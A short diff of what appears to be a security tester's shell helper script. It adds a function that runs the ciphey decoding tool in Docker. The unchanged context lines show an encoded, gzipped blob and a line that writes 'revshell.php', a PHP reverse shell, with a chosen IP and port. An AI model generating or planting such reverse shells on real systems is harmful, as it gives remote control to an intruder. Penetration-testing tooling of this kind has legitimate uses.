@@ -257,3 +257,8 @@ RiY8d0sal9NG5WunDw0bzT/18DMMf35Bg38BTHZA/VcPAAA=" | gunzip )
 echo -e "$filetop\n\$ip = '$ipaddy';\n\$port = '$1'; \n$filebottom" > revshell.php
 
 }
+
+
+ciphey(){                                                                              
+docker run -it --rm remnux/ciphey "${@:2}"
+}
